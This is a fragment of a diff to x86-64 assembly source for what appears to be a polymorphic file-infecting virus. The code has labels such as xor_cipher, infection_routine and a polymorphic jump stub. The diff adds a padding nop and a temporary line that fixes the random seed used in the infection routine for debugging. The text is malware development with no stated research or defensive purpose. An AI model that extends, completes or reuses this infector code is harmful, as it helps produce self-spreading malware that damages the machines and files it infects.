@@ -68,6 +68,8 @@ POLY_jmp_program_entry_begin:
 	je program_entry				; goto program_entry
 POLY_jmp_program_entry_end:
 
+	nop						; Needed because of script bug about two labels following
+
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
@@ -597,6 +599,7 @@ infection_routine:
 	mov rax, SYS_TIME				; _ret = time(
 	xor rdi, rdi					; NULL
 	syscall						; );
+	mov rax, 7			; TEMP TODO DEBUG JUST TO FAKE RANDOM
 
 	add rax, [rel fingerprint_int]			; _base = _ret + fingerprint_int;
 	mov rdi, rax					; srand(_base);
